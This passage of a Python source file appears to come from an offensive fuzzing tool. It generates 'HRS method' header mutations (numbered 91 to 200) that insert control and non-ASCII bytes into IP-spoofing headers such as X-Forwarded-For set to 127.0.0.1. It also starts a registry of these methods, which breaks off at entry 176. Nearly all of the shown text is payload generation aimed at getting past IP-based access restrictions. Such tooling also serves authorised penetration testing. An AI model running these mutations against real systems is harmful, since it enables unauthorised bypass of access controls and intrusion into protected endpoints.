for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers91.append(f"\x0F{ip_header}: {ip_header_value}")

# HRS method 92: E.g. `X-Forwarded-For\x0F: 127.0.0.1`
mutation_headers92 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers92.append(f"{ip_header}\x0F: {ip_header_value}")

# HRS method 93: E.g. `X-Forwarded-For:\x0F127.0.0.1`
mutation_headers93 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers93.append(f"{ip_header}:\x0F{ip_header_value}")

# HRS method 94: E.g. `X-Forwarded-For: \x0F127.0.0.1`
mutation_headers94 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers94.append(f"{ip_header}: \x0F{ip_header_value}")

# HRS method 95: E.g. `X-Forwarded-For: 127.0.0.1\x0F`
mutation_headers95 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers95.append(f"{ip_header}: {ip_header_value}\x0F")
# ---------------------------------------------------------------------------------------------------

# HRS method 96: E.g. `\x10X-Forwarded-For: 127.0.0.1`
mutation_headers96 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers96.append(f"\x10{ip_header}: {ip_header_value}")

# HRS method 97: E.g. `X-Forwarded-For\x10: 127.0.0.1`
mutation_headers97 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers97.append(f"{ip_header}\x10: {ip_header_value}")

# HRS method 98: E.g. `X-Forwarded-For:\x10127.0.0.1`
mutation_headers98 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers98.append(f"{ip_header}:\x10{ip_header_value}")

# HRS method 99: E.g. `X-Forwarded-For: \x10127.0.0.1`
mutation_headers99 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers99.append(f"{ip_header}: \x10{ip_header_value}")

# HRS method 100: E.g. `X-Forwarded-For: 127.0.0.1\x10`
mutation_headers100 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers100.append(f"{ip_header}: {ip_header_value}\x10")
# ---------------------------------------------------------------------------------------------------

# HRS method 101: E.g. `\x11X-Forwarded-For: 127.0.0.1`
mutation_headers101 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers101.append(f"\x11{ip_header}: {ip_header_value}")

# HRS method 102: E.g. `X-Forwarded-For\x11: 127.0.0.1`
mutation_headers102 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers102.append(f"{ip_header}\x11: {ip_header_value}")

# HRS method 103: E.g. `X-Forwarded-For:\x11127.0.0.1`
mutation_headers103 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers103.append(f"{ip_header}:\x11{ip_header_value}")

# HRS method 104: E.g. `X-Forwarded-For: \x11127.0.0.1`
mutation_headers104 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers104.append(f"{ip_header}: \x11{ip_header_value}")

# HRS method 105: E.g. `X-Forwarded-For: 127.0.0.1\x11`
mutation_headers105 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers105.append(f"{ip_header}: {ip_header_value}\x11")
# ---------------------------------------------------------------------------------------------------

# HRS method 106: E.g. `\x12X-Forwarded-For: 127.0.0.1`
mutation_headers106 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers106.append(f"\x12{ip_header}: {ip_header_value}")

# HRS method 107: E.g. `X-Forwarded-For\x12: 127.0.0.1`
mutation_headers107 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers107.append(f"{ip_header}\x12: {ip_header_value}")

# HRS method 108: E.g. `X-Forwarded-For:\x12127.0.0.1`
mutation_headers108 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers108.append(f"{ip_header}:\x12{ip_header_value}")

# HRS method 109: E.g. `X-Forwarded-For: \x12127.0.0.1`
mutation_headers109 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers109.append(f"{ip_header}: \x12{ip_header_value}")

# HRS method 110: E.g. `X-Forwarded-For: 127.0.0.1\x12`
mutation_headers110 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers110.append(f"{ip_header}: {ip_header_value}\x12")
# ---------------------------------------------------------------------------------------------------

# HRS method 111: E.g. `\x13X-Forwarded-For: 127.0.0.1`
mutation_headers111 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers111.append(f"\x13{ip_header}: {ip_header_value}")

# HRS method 112: E.g. `X-Forwarded-For\x13: 127.0.0.1`
mutation_headers112 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers112.append(f"{ip_header}\x13: {ip_header_value}")

# HRS method 113: E.g. `X-Forwarded-For:\x13127.0.0.1`
mutation_headers113 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers113.append(f"{ip_header}:\x13{ip_header_value}")

# HRS method 114: E.g. `X-Forwarded-For: \x13127.0.0.1`
mutation_headers114 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers114.append(f"{ip_header}: \x13{ip_header_value}")

# HRS method 115: E.g. `X-Forwarded-For: 127.0.0.1\x13`
mutation_headers115 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers115.append(f"{ip_header}: {ip_header_value}\x13")
# ---------------------------------------------------------------------------------------------------

# HRS method 116: E.g. `\x14X-Forwarded-For: 127.0.0.1`
mutation_headers116 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers116.append(f"\x14{ip_header}: {ip_header_value}")

# HRS method 117: E.g. `X-Forwarded-For\x14: 127.0.0.1`
mutation_headers117 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers117.append(f"{ip_header}\x14: {ip_header_value}")

# HRS method 118: E.g. `X-Forwarded-For:\x14127.0.0.1`
mutation_headers118 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers118.append(f"{ip_header}:\x14{ip_header_value}")

# HRS method 119: E.g. `X-Forwarded-For: \x14127.0.0.1`
mutation_headers119 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers119.append(f"{ip_header}: \x14{ip_header_value}")

# HRS method 120: E.g. `X-Forwarded-For: 127.0.0.1\x14`
mutation_headers120 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers120.append(f"{ip_header}: {ip_header_value}\x14")
# ---------------------------------------------------------------------------------------------------

# HRS method 121: E.g. `\x15X-Forwarded-For: 127.0.0.1`
mutation_headers121 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers121.append(f"\x15{ip_header}: {ip_header_value}")

# HRS method 122: E.g. `X-Forwarded-For\x15: 127.0.0.1`
mutation_headers122 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers122.append(f"{ip_header}\x15: {ip_header_value}")

# HRS method 123: E.g. `X-Forwarded-For:\x15127.0.0.1`
mutation_headers123 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers123.append(f"{ip_header}:\x15{ip_header_value}")

# HRS method 124: E.g. `X-Forwarded-For: \x15127.0.0.1`
mutation_headers124 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers124.append(f"{ip_header}: \x15{ip_header_value}")

# HRS method 125: E.g. `X-Forwarded-For: 127.0.0.1\x15`
mutation_headers125 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers125.append(f"{ip_header}: {ip_header_value}\x15")
# ---------------------------------------------------------------------------------------------------

# HRS method 126: E.g. `\x16X-Forwarded-For: 127.0.0.1`
mutation_headers126 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers126.append(f"\x16{ip_header}: {ip_header_value}")

# HRS method 127: E.g. `X-Forwarded-For\x16: 127.0.0.1`
mutation_headers127 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers127.append(f"{ip_header}\x16: {ip_header_value}")

# HRS method 128: E.g. `X-Forwarded-For:\x16127.0.0.1`
mutation_headers128 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers128.append(f"{ip_header}:\x16{ip_header_value}")

# HRS method 129: E.g. `X-Forwarded-For: \x16127.0.0.1`
mutation_headers129 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers129.append(f"{ip_header}: \x16{ip_header_value}")

# HRS method 130: E.g. `X-Forwarded-For: 127.0.0.1\x16`
mutation_headers130 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers130.append(f"{ip_header}: {ip_header_value}\x16")
# ---------------------------------------------------------------------------------------------------

# HRS method 131: E.g. `\x17X-Forwarded-For: 127.0.0.1`
mutation_headers131 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers131.append(f"\x17{ip_header}: {ip_header_value}")

# HRS method 132: E.g. `X-Forwarded-For\x17: 127.0.0.1`
mutation_headers132 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers132.append(f"{ip_header}\x17: {ip_header_value}")

# HRS method 133: E.g. `X-Forwarded-For:\x17127.0.0.1`
mutation_headers133 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers133.append(f"{ip_header}:\x17{ip_header_value}")

# HRS method 134: E.g. `X-Forwarded-For: \x17127.0.0.1`
mutation_headers134 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers134.append(f"{ip_header}: \x17{ip_header_value}")

# HRS method 135: E.g. `X-Forwarded-For: 127.0.0.1\x17`
mutation_headers135 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers135.append(f"{ip_header}: {ip_header_value}\x17")
# ---------------------------------------------------------------------------------------------------

# HRS method 136: E.g. `\x18X-Forwarded-For: 127.0.0.1`
mutation_headers136 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers136.append(f"\x18{ip_header}: {ip_header_value}")

# HRS method 137: E.g. `X-Forwarded-For\x18: 127.0.0.1`
mutation_headers137 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers137.append(f"{ip_header}\x18: {ip_header_value}")

# HRS method 138: E.g. `X-Forwarded-For:\x18127.0.0.1`
mutation_headers138 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers138.append(f"{ip_header}:\x18{ip_header_value}")

# HRS method 139: E.g. `X-Forwarded-For: \x18127.0.0.1`
mutation_headers139 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers139.append(f"{ip_header}: \x18{ip_header_value}")

# HRS method 140: E.g. `X-Forwarded-For: 127.0.0.1\x18`
mutation_headers140 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers140.append(f"{ip_header}: {ip_header_value}\x18")
# ---------------------------------------------------------------------------------------------------

# HRS method 141: E.g. `\x19X-Forwarded-For: 127.0.0.1`
mutation_headers141 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers141.append(f"\x19{ip_header}: {ip_header_value}")

# HRS method 142: E.g. `X-Forwarded-For\x19: 127.0.0.1`
mutation_headers142 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers142.append(f"{ip_header}\x19: {ip_header_value}")

# HRS method 143: E.g. `X-Forwarded-For:\x19127.0.0.1`
mutation_headers143 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers143.append(f"{ip_header}:\x19{ip_header_value}")

# HRS method 144: E.g. `X-Forwarded-For: \x19127.0.0.1`
mutation_headers144 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers144.append(f"{ip_header}: \x19{ip_header_value}")

# HRS method 145: E.g. `X-Forwarded-For: 127.0.0.1\x19`
mutation_headers145 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers145.append(f"{ip_header}: {ip_header_value}\x19")
# ---------------------------------------------------------------------------------------------------

# HRS method 146: E.g. `\x1AX-Forwarded-For: 127.0.0.1`
mutation_headers146 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers146.append(f"\x1A{ip_header}: {ip_header_value}")

# HRS method 147: E.g. `X-Forwarded-For\x1A: 127.0.0.1`
mutation_headers147 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers147.append(f"{ip_header}\x1A: {ip_header_value}")

# HRS method 148: E.g. `X-Forwarded-For:\x1A127.0.0.1`
mutation_headers148 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers148.append(f"{ip_header}:\x1A{ip_header_value}")

# HRS method 149: E.g. `X-Forwarded-For: \x1A127.0.0.1`
mutation_headers149 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers149.append(f"{ip_header}: \x1A{ip_header_value}")

# HRS method 150: E.g. `X-Forwarded-For: 127.0.0.1\x1A`
mutation_headers150 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers150.append(f"{ip_header}: {ip_header_value}\x1A")
# ---------------------------------------------------------------------------------------------------

# HRS method 151: E.g. `\x1BX-Forwarded-For: 127.0.0.1`
mutation_headers151 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers151.append(f"\x1B{ip_header}: {ip_header_value}")

# HRS method 152: E.g. `X-Forwarded-For\x1B: 127.0.0.1`
mutation_headers152 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers152.append(f"{ip_header}\x1B: {ip_header_value}")

# HRS method 153: E.g. `X-Forwarded-For:\x1B127.0.0.1`
mutation_headers153 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers153.append(f"{ip_header}:\x1B{ip_header_value}")

# HRS method 154: E.g. `X-Forwarded-For: \x1B127.0.0.1`
mutation_headers154 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers154.append(f"{ip_header}: \x1B{ip_header_value}")

# HRS method 155: E.g. `X-Forwarded-For: 127.0.0.1\x1B`
mutation_headers155 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers155.append(f"{ip_header}: {ip_header_value}\x1B")
# ---------------------------------------------------------------------------------------------------

# HRS method 156: E.g. `\x1CX-Forwarded-For: 127.0.0.1`
mutation_headers156 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers156.append(f"\x1C{ip_header}: {ip_header_value}")

# HRS method 157: E.g. `X-Forwarded-For\x1C: 127.0.0.1`
mutation_headers157 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers157.append(f"{ip_header}\x1C: {ip_header_value}")

# HRS method 158: E.g. `X-Forwarded-For:\x1C127.0.0.1`
mutation_headers158 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers158.append(f"{ip_header}:\x1C{ip_header_value}")

# HRS method 159: E.g. `X-Forwarded-For: \x1C127.0.0.1`
mutation_headers159 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers159.append(f"{ip_header}: \x1C{ip_header_value}")

# HRS method 160: E.g. `X-Forwarded-For: 127.0.0.1\x1C`
mutation_headers160 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers160.append(f"{ip_header}: {ip_header_value}\x1C")
# ---------------------------------------------------------------------------------------------------

# HRS method 161: E.g. `\x1DX-Forwarded-For: 127.0.0.1`
mutation_headers161 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers161.append(f"\x1D{ip_header}: {ip_header_value}")

# HRS method 162: E.g. `X-Forwarded-For\x1D: 127.0.0.1`
mutation_headers162 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers162.append(f"{ip_header}\x1D: {ip_header_value}")

# HRS method 163: E.g. `X-Forwarded-For:\x1D127.0.0.1`
mutation_headers163 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers163.append(f"{ip_header}:\x1D{ip_header_value}")

# HRS method 164: E.g. `X-Forwarded-For: \x1D127.0.0.1`
mutation_headers164 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers164.append(f"{ip_header}: \x1D{ip_header_value}")

# HRS method 165: E.g. `X-Forwarded-For: 127.0.0.1\x1D`
mutation_headers165 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers165.append(f"{ip_header}: {ip_header_value}\x1D")
# ---------------------------------------------------------------------------------------------------

# HRS method 166: E.g. `\x1EX-Forwarded-For: 127.0.0.1`
mutation_headers166 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers166.append(f"\x1E{ip_header}: {ip_header_value}")

# HRS method 167: E.g. `X-Forwarded-For\x1E: 127.0.0.1`
mutation_headers167 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers167.append(f"{ip_header}\x1E: {ip_header_value}")

# HRS method 168: E.g. `X-Forwarded-For:\x1E127.0.0.1`
mutation_headers168 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers168.append(f"{ip_header}:\x1E{ip_header_value}")

# HRS method 169: E.g. `X-Forwarded-For: \x1E127.0.0.1`
mutation_headers169 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers169.append(f"{ip_header}: \x1E{ip_header_value}")

# HRS method 170: E.g. `X-Forwarded-For: 127.0.0.1\x1E`
mutation_headers170 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers170.append(f"{ip_header}: {ip_header_value}\x1E")
# ---------------------------------------------------------------------------------------------------

# HRS method 171: E.g. `\x1FX-Forwarded-For: 127.0.0.1`
mutation_headers171 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers171.append(f"\x1F{ip_header}: {ip_header_value}")

# HRS method 172: E.g. `X-Forwarded-For\x1F: 127.0.0.1`
mutation_headers172 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers172.append(f"{ip_header}\x1F: {ip_header_value}")

# HRS method 173: E.g. `X-Forwarded-For:\x1F127.0.0.1`
mutation_headers173 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers173.append(f"{ip_header}:\x1F{ip_header_value}")

# HRS method 174: E.g. `X-Forwarded-For: \x1F127.0.0.1`
mutation_headers174 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers174.append(f"{ip_header}: \x1F{ip_header_value}")

# HRS method 175: E.g. `X-Forwarded-For: 127.0.0.1\x1F`
mutation_headers175 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers175.append(f"{ip_header}: {ip_header_value}\x1F")
# ---------------------------------------------------------------------------------------------------

# HRS method 176: E.g. `\x20X-Forwarded-For: 127.0.0.1`
mutation_headers176 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers176.append(f"\x20{ip_header}: {ip_header_value}")

# HRS method 177: E.g. `X-Forwarded-For\x20: 127.0.0.1`
mutation_headers177 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers177.append(f"{ip_header}\x20: {ip_header_value}")

# HRS method 178: E.g. `X-Forwarded-For:\x20127.0.0.1`
mutation_headers178 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers178.append(f"{ip_header}:\x20{ip_header_value}")

# HRS method 179: E.g. `X-Forwarded-For: \x20127.0.0.1`
mutation_headers179 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers179.append(f"{ip_header}: \x20{ip_header_value}")

# HRS method 180: E.g. `X-Forwarded-For: 127.0.0.1\x20`
mutation_headers180 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers180.append(f"{ip_header}: {ip_header_value}\x20")
# ---------------------------------------------------------------------------------------------------

# HRS method 181: E.g. `\x7FX-Forwarded-For: 127.0.0.1`
mutation_headers181 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers181.append(f"\x7F{ip_header}: {ip_header_value}")

# HRS method 182: E.g. `X-Forwarded-For\x7F: 127.0.0.1`
mutation_headers182 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers182.append(f"{ip_header}\x7F: {ip_header_value}")

# HRS method 183: E.g. `X-Forwarded-For:\x7F127.0.0.1`
mutation_headers183 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers183.append(f"{ip_header}:\x7F{ip_header_value}")

# HRS method 184: E.g. `X-Forwarded-For: \x7F127.0.0.1`
mutation_headers184 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers184.append(f"{ip_header}: \x7F{ip_header_value}")

# HRS method 185: E.g. `X-Forwarded-For: 127.0.0.1\x7F`
mutation_headers185 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers185.append(f"{ip_header}: {ip_header_value}\x7F")
# ---------------------------------------------------------------------------------------------------

# HRS method 186: E.g. `\x81X-Forwarded-For: 127.0.0.1`
mutation_headers186 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers186.append(f"\x81{ip_header}: {ip_header_value}")

# HRS method 187: E.g. `X-Forwarded-For\x81: 127.0.0.1`
mutation_headers187 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers187.append(f"{ip_header}\x81: {ip_header_value}")

# HRS method 188: E.g. `X-Forwarded-For:\x81127.0.0.1`
mutation_headers188 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers188.append(f"{ip_header}:\x81{ip_header_value}")

# HRS method 189: E.g. `X-Forwarded-For: \x81127.0.0.1`
mutation_headers189 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers189.append(f"{ip_header}: \x81{ip_header_value}")

# HRS method 190: E.g. `X-Forwarded-For: 127.0.0.1\x81`
mutation_headers190 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers190.append(f"{ip_header}: {ip_header_value}\x81")
# ---------------------------------------------------------------------------------------------------

# HRS method 191: E.g. `\xA0X-Forwarded-For: 127.0.0.1`
mutation_headers191 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers191.append(f"\xA0{ip_header}: {ip_header_value}")

# HRS method 192: E.g. `X-Forwarded-For\xA0: 127.0.0.1`
mutation_headers192 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers192.append(f"{ip_header}\xA0: {ip_header_value}")

# HRS method 193: E.g. `X-Forwarded-For:\xA0127.0.0.1`
mutation_headers193 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers193.append(f"{ip_header}:\xA0{ip_header_value}")

# HRS method 194: E.g. `X-Forwarded-For: \xA0127.0.0.1`
mutation_headers194 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers194.append(f"{ip_header}: \xA0{ip_header_value}")

# HRS method 195: E.g. `X-Forwarded-For: 127.0.0.1\xA0`
mutation_headers195 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers195.append(f"{ip_header}: {ip_header_value}\xA0")
# ---------------------------------------------------------------------------------------------------

# HRS method 196: E.g. `\xADX-Forwarded-For: 127.0.0.1`
mutation_headers196 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers196.append(f"\xAD{ip_header}: {ip_header_value}")

# HRS method 197: E.g. `X-Forwarded-For\xAD: 127.0.0.1`
mutation_headers197 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers197.append(f"{ip_header}\xAD: {ip_header_value}")

# HRS method 198: E.g. `X-Forwarded-For:\xAD127.0.0.1`
mutation_headers198 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers198.append(f"{ip_header}:\xAD{ip_header_value}")

# HRS method 199: E.g. `X-Forwarded-For: \xAD127.0.0.1`
mutation_headers199 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers199.append(f"{ip_header}: \xAD{ip_header_value}")

# HRS method 200: E.g. `X-Forwarded-For: 127.0.0.1\xAD`
mutation_headers200 = []
for ip_header in ip_headers:
    for ip_header_value in ip_header_values:
        mutation_headers200.append(f"{ip_header}: {ip_header_value}\xAD")
# ---------------------------------------------------------------------------------------------------


def parse_headers(header_string):
    """
    Parses a raw HTTP header string into a dictionary.
    
    Args:
        header_string (str): Multiline string containing headers.
        
    Returns:
        dict: Dictionary with header names as keys and header values as values.
    """
    headers = {}
    for line in header_string.strip().splitlines():
        if not line.strip():
            continue  # Skip empty lines
        parts = line.split(":", 1)
        if len(parts) == 2:
            key, value = parts
            headers[key.strip()] = value.strip()
    return headers


def get_base_url(url):
    """
    Returns the base URL (scheme + domain) from an arbitrary URL.
    Example: http://example.com/admin -> http://example.com
    """
    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"


#* To test only selected techniques, comment out HRS method item from all_mutation_headers dictionary
all_mutation_headers = {
    1: mutation_headers1,
    2: mutation_headers2,
    3: mutation_headers3,
    4: mutation_headers4,
    5: mutation_headers5,
    6: mutation_headers6,
    7: mutation_headers7,
    8: mutation_headers8,
    9: mutation_headers9,
    10: mutation_headers10,
    11: mutation_headers11,
    12: mutation_headers12,
    13: mutation_headers13,
    14: mutation_headers14,
    15: mutation_headers15,
    16: mutation_headers16,
    17: mutation_headers17,
    18: mutation_headers18,
    19: mutation_headers19,
    20: mutation_headers20,
    21: mutation_headers21,
    22: mutation_headers22,
    23: mutation_headers23,
    24: mutation_headers24,
    25: mutation_headers25,
    26: mutation_headers26,
    27: mutation_headers27,
    28: mutation_headers28,
    29: mutation_headers29,
    30: mutation_headers30,
    31: mutation_headers31,
    32: mutation_headers32,
    33: mutation_headers33,
    34: mutation_headers34,
    35: mutation_headers35,
    36: mutation_headers36,
    37: mutation_headers37,
    38: mutation_headers38,
    39: mutation_headers39,
    40: mutation_headers40,
    41: mutation_headers41,
    42: mutation_headers42,
    43: mutation_headers43,
    44: mutation_headers44,
    45: mutation_headers45,
    46: mutation_headers46,
    47: mutation_headers47,
    48: mutation_headers48,
    49: mutation_headers49,
    50: mutation_headers50,
    51: mutation_headers51,
    52: mutation_headers52,
    53: mutation_headers53,
    54: mutation_headers54,
    55: mutation_headers55,
    56: mutation_headers56,
    57: mutation_headers57,
    58: mutation_headers58,
    59: mutation_headers59,
    60: mutation_headers60,
    61: mutation_headers61,
    62: mutation_headers62,
    63: mutation_headers63,
    64: mutation_headers64,
    65: mutation_headers65,
    66: mutation_headers66,
    67: mutation_headers67,
    68: mutation_headers68,
    69: mutation_headers69,
    70: mutation_headers70,
    71: mutation_headers71,
    72: mutation_headers72,
    73: mutation_headers73,
    74: mutation_headers74,
    75: mutation_headers75,
    76: mutation_headers76,
    77: mutation_headers77,
    78: mutation_headers78,
    79: mutation_headers79,
    80: mutation_headers80,
    81: mutation_headers81,
    82: mutation_headers82,
    83: mutation_headers83,
    84: mutation_headers84,
    85: mutation_headers85,
    86: mutation_headers86,
    87: mutation_headers87,
    88: mutation_headers88,
    89: mutation_headers89,
    90: mutation_headers90,
    91: mutation_headers91,
    92: mutation_headers92,
    93: mutation_headers93,
    94: mutation_headers94,
    95: mutation_headers95,
    96: mutation_headers96,
    97: mutation_headers97,
    98: mutation_headers98,
    99: mutation_headers99,
    100: mutation_headers100,
    101: mutation_headers101,
    102: mutation_headers102,
    103: mutation_headers103,
    104: mutation_headers104,
    105: mutation_headers105,
    106: mutation_headers106,
    107: mutation_headers107,
    108: mutation_headers108,
    109: mutation_headers109,
    110: mutation_headers110,
    111: mutation_headers111,
    112: mutation_headers112,
    113: mutation_headers113,
    114: mutation_headers114,
    115: mutation_headers115,
    116: mutation_headers116,
    117: mutation_headers117,
    118: mutation_headers118,
    119: mutation_headers119,
    120: mutation_headers120,
    121: mutation_headers121,
    122: mutation_headers122,
    123: mutation_headers123,
    124: mutation_headers124,
    125: mutation_headers125,
    126: mutation_headers126,
    127: mutation_headers127,
    128: mutation_headers128,
    129: mutation_headers129,
    130: mutation_headers130,
    131: mutation_headers131,
    132: mutation_headers132,
    133: mutation_headers133,
    134: mutation_headers134,
    135: mutation_headers135,
    136: mutation_headers136,
    137: mutation_headers137,
    138: mutation_headers138,
    139: mutation_headers139,
    140: mutation_headers140,
    141: mutation_headers141,
    142: mutation_headers142,
    143: mutation_headers143,
    144: mutation_headers144,
    145: mutation_headers145,
    146: mutation_headers146,
    147: mutation_headers147,
    148: mutation_headers148,
    149: mutation_headers149,
    150: mutation_headers150,
    151: mutation_headers151,
    152: mutation_headers152,
    153: mutation_headers153,
    154: mutation_headers154,
    155: mutation_headers155,
    156: mutation_headers156,
    157: mutation_headers157,
    158: mutation_headers158,
    159: mutation_headers159,
    160: mutation_headers160,
    161: mutation_headers161,
    162: mutation_headers162,
    163: mutation_headers163,
    164: mutation_headers164,
    165: mutation_headers165,
    166: mutation_headers166,
    167: mutation_headers167,
    168: mutation_headers168,
    169: mutation_headers169,
    170: mutation_headers170,
    171: mutation_headers171,
    172: mutation_headers172,
    173: mutation_headers173,
    174: mutation_headers174,
    175: mutation_headers175,
    176: mutation_headers176,
